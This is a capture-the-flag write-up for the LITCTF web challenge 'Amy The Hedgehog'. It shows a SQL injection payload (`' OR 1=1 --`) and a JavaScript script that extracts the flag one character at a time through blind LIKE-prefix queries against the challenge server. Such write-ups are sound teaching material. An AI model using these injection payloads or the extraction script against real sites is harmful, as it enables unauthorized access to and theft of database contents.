# web/Amy The Hedgehog

## Challenge

Hi guys! I just learned sqlite3 build my own websiteeee. Come visit my [my website](http://litctf.live:31770/) pleaseeee i am ami the dhedghog!!! :3 ( ◡‿◡ *)

## Solution

We have to guess Amy's crush (a synonym of "the flag"). Guessing `' OR 1=1 --` returns "(≧U≦❁) You got it!!!", so it is vulnerable.

Classic. We're given a yes/no response to a query.
To avoid brute force, we can figure out the flag character-by-character using `LIKE 'prefix%'` (trying `LITCTF{a%`, ..., `LITCTF{z%` to see `LITCTF{s%` matches, then `LITCTF{sa%`, ..., `LITCTF{sz%`, etc.).

We automate! We can open the Network panel in DevTools (inspector), submit a query with `' OR name LIKE 'sanic%' --`, and "copy as fetch" the request:
```js
await fetch("http://litctf.live:31770/", {
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded",
    },
    "body": "name=%27+OR+name+LIKE+%27LITCTF%7Bsanic%25%27+--",
    "method": "POST",
});
```
(This request has been stripped down to the essentials.)

Then, we just do some templating and map each possible character to a request:
```js
await (async () => {
    const chars = [..."}abcdefghijklmnopqrstuvwxyz"];
    let flag = "LITCTF{";
    while (true) {
        const res = await Promise.all(chars.map(async c=>
            (
                await (
                    await fetch("http://litctf.live:31770/", {
                        "headers": {
                            "Content-Type": "application/x-www-form-urlencoded",
                        },
                        "body": `name=%27+OR+name+LIKE+%27${flag}${c}%25%27+--`,
                        "method": "POST",
                    })
                ).text()
            ).includes("You got it!!!")
        )); // whether each character worked
        const next = chars.filter((_,i) => res[i]); // correct character(s) (hopefully singular)
        console.log(next);
        if (next.length != 1) throw new Error("bruh");
        flag += next[0];
        if (next[0] == "}") break;
    }
    return flag;
})();
// LITCTF{sldjf}
```
(This is run in the console on the same page, to avoid CORS issues.)


Note `LIKE` queries are case-insensitive, but it happens that the flag's content is all lowercase, as guessing this flag directly confirms it works.

## Flag

`LITCTF{sldjf}`
